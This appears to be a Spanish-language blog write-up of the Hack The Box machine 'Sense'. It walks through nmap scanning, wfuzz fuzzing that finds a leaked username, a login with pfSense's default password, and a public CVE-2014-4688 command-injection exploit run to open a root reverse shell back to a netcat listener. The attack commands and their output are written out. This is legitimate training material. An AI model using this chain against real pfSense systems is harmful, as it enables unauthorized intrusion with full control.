---
layout: single
title: Sense - Hack The Box
excerpt: "Esta fue una máquina que jugo un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que, si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio y se utilizó un Exploit, el CVE-2014-4688, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios."
date: 2023-03-08
classes: wide
header:
  teaser: /assets/images/htb-writeup-sense/sense_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - PF Sense
  - Fuzzing
  - Information Leakage
  - Command Injection - CI
  - CI - CVE-2014-4688
  - OSCP Style
---
![](/assets/images/htb-writeup-sense/sense_logo.png)
Esta fue una máquina que jugo un poco con mi paciencia porque utilicé **Fuzzing** para listar archivos en la página web para encontrar algo Útil, que, si encontrÉ, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para accesar al servicio y se utilizó un Exploit, el **CVE-2014-4688**, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios.

# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.60                                                                                     
PING 10.10.10.60 (10.10.10.60) 56(84) bytes of data.
64 bytes from 10.10.10.60: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.10.10.60: icmp_seq=2 ttl=63 time=130 ms
64 bytes from 10.10.10.60: icmp_seq=3 ttl=63 time=131 ms
64 bytes from 10.10.10.60: icmp_seq=4 ttl=63 time=131 ms

--- 10.10.10.60 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 130.494/131.036/131.810/0.483 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:43 CST
Initiating SYN Stealth Scan at 13:43
Scanning 10.10.10.60 [65535 ports]
Discovered open port 80/tcp on 10.10.10.60
Discovered open port 443/tcp on 10.10.10.60
Increasing send delay for 10.10.10.60 from 0 to 5 due to 11 out of 16 dropped probes since last increase.
Completed SYN Stealth Scan at 13:44, 30.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.60
Host is up, received user-set (0.61s latency).
Scanned at 2023-03-08 13:43:35 CST for 31s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.87 seconds
           Raw packets sent: 131088 (5.768MB) | Rcvd: 18 (792B)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Veo únicamente dos puertos activos, el que ya conocemos el puerto HTTP y otro. Veamos que nos dice el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p80,443 10.10.10.60 -oN targeted                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:45 CST
Nmap scan report for 10.10.10.60
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Supongo que al entrar en la página web nos redirigirá al puerto 443, igualmente vemos que usan un servicio versión **lighthttpd 1.4.35**. Veamos que nos dice la página.

# Análisis de Vulnerabilidades
## Análisis de Puerto 80
Entremos a ver que show.

Justamente, cuando ponemos la IP nos dice que hay riesgo y bla bla bla, dando en acepta el riesgo nos va a redirigir a un login.

![](/assets/images/htb-writeup-sense/Captura1.png)

Se puede ver algo llamado **PF Sense**, supongo que es el servicio que usa la página, antes de investigarlo, veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura2.png">
</p>

Ahí vemos el servidor web y la página usa PHP, ahora investiguemos el servicio.

**pfSense es una distribución personalizada de FreeBSD adaptado para su uso como Firewall y Enrutador. Se caracteriza por ser de código abierto, puede ser instalado en una gran variedad de ordenadores, y además cuenta con una interfaz web sencilla para su configuración.**

Ósea que es un Firewall y enrutador, intentemos entrar con credenciales por defecto, estas son:
* Username: admin
* Contraseña: pfsense

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura4.png">
</p>

No pues no sirvió, mejor hagamos un Fuzzing para saber que subpáginas tiene. **OJO**, se tiene que cambiar el comando porque saldrán muchos 301, para solucionarlo le agregamos la **-L**.

# Fuzzing
```
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.60/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000007:   200        173 L    425 W      6690 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000003:   200        173 L    425 W      6690 Ch     "# Copyright 2007 James Fisher"                                             
000000001:   200        173 L    425 W      6690 Ch     "# directory-list-2.3-medium.txt"                                           
000000014:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     
000000013:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000012:   200        173 L    425 W      6690 Ch     "# on atleast 2 different hosts"                                            
000000011:   200        173 L    425 W      6690 Ch     "# Priority ordered case sensative list, where entries were found"          
000000010:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000009:   200        173 L    425 W      6690 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
000000006:   200        173 L    425 W      6690 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000008:   200        173 L    425 W      6690 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
000000005:   200        173 L    425 W      6690 Ch     "# This work is licensed under the Creative Commons"                        
000000002:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000004:   200        173 L    425 W      6690 Ch     "#"                                                                         
000003597:   200        228 L    851 W      7492 Ch     "tree"                                                                      
000008057:   200        173 L    404 W      6113 Ch     "installer"                                                                 
000045240:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     

Total time: 1527.095
Processed Requests: 220560
Filtered Requests: 220543
Requests/sec.: 144.4310
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Veo 2 subpáginas, pero **installer** no servirá así que vamos directamente con la **tree**:

![](/assets/images/htb-writeup-sense/Captura5.png)

El servicio **SilverStripe** parece ser un gestor de archivos de texto y CSS, que se me hace que podemos listar esos archivos especificándolos en el Fuzzing:
```
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ.txt/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.60/FUZZ.txt/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   200        173 L    425 W      6690 Ch     "# directory-list-2.3-medium.txt"                                           
000000003:   200        173 L    425 W      6690 Ch     "# Copyright 2007 James Fisher"                                             
000000007:   200        173 L    425 W      6690 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000012:   200        173 L    425 W      6690 Ch     "# on atleast 2 different hosts"                                            
000000011:   200        173 L    425 W      6690 Ch     "# Priority ordered case sensative list, where entries were found"          
000000013:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000010:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000009:   200        173 L    425 W      6690 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
000000006:   200        173 L    425 W      6690 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000008:   200        173 L    425 W      6690 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
000000005:   200        173 L    425 W      6690 Ch     "# This work is licensed under the Creative Commons"                        
000000002:   200        173 L    425 W      6690 Ch     "#"                                                                         
000000004:   200        173 L    425 W      6690 Ch     "#"                                                                         
000001268:   200        9 L      40 W       271 Ch      "changelog"                                                                 
000120222:   200        6 L      12 W       106 Ch      "system-users"                                                              

Total time: 1952.265
Processed Requests: 220560
Filtered Requests: 220545
Requests/sec.: 112.9764
```
Aparece un archivo llamado **Changelog**, veamos si podemos verlo:

![](/assets/images/htb-writeup-sense/Captura6.png)

Después de leer el mensaje que nos apareció, sabemos que hay una vulnerabilidad que aún no han parchado. Bien, pero lo que nos interesa ahorita es saber si podemos acceder a la página web para poder obtener la versión del **PF Sense** y con eso podamos usar un Exploit.

Aunque tambien podemos buscar un Exploit para el servicio **SilverStripe**. Pero vamos a ver el otro archivo que se encontró, el **system-users**.

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura7.png">
</p>

Ohhhh ya tenemos un usuario y está usando la contraseña por defecto de **PF Sense**, intentemos entrar:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura8.png">
</p>

¡Excelente! Ya estamos dentro:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura9.png">
</p>

Ahí está la versión del **PF Sense**, ahora podemos buscar un Exploit para este servicio.

# Explotación Vulnerabilidades
```
searchsploit pfsense 2.1.3                                                                               
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                             | php/webapps/43560.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Solo aparece un Exploit, así que vamos a analizarlo para ver cómo usarlo contra la máquina:
```
searchsploit -m php/webapps/43560.py 
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
    Codes: CVE-2014-4688
 Verified: False
File Type: Python script, ASCII text executable
```
Después de ver el contenido del Exploit, nos pide los siguientes parámetros:
```
rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password
```
Incluso si lo ejecutamos, nos dirá como usarlo pues ya tiene permisos de ejecución (lo cual no me gusta mucho que digamos, pero bueno xd):
```
./PFSense_Exploit.py -h
usage: PFSense_Exploit.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT] [--username USERNAME] [--password PASSWORD]

options:
  -h, --help           show this help message and exit
  --rhost RHOST        Remote Host
  --lhost LHOST        Local Host listener
  --lport LPORT        Local Port listener
  --username USERNAME  pfsense Username
  --password PASSWORD  pfsense Password
```
Muy bien, pongamos lo que pide y activémoslo:
* Activamos una netcat
```
nc -nvlp 443                                  
listening on [any] 443 ...
```
* Usamos el Exploit:
```
./PFSense_Exploit.py --rhost 10.10.10.60 --lhost 10.10.14.16 --lport 443 --username rohit --password pfsense
```
* Resultado:
```
nc -nvlp 443                                  
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.60] 46858
sh: can't access tty; job control turned off
# whoami
root
```
Ahhh prro pues que bien, nos conecto directamente como Root.

# Post Explotación
Ya lo único que debemos hacer es buscar las flags:
* Flag del usuario:
```
# cd /home
# ls
.snap
rohit
# cd rohit
# ls
.tcshrc
user.txt
# cat user.txt
```
* Flag del Root:
```
# cd /root
# ls
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
# cat root.txt
```
¡Y listo!

## Links de Investigación
* http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122
* https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/
* https://www.exploit-db.com/exploits/38780
* https://www.exploit-db.com/exploits/34113
* https://www.exploit-db.com/exploits/43560

# FIN
